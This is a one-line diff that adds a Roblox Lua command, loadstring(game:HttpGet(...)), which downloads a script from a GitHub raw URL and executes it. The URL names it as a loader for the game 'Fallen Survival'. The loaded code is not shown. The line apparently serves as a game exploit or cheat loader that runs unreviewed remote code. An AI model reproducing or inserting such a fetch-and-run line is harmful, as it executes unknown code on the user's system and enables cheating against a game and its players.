@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/new-map-fallen-survival-spam3-9duq2b8lgq93j5.lua"))()
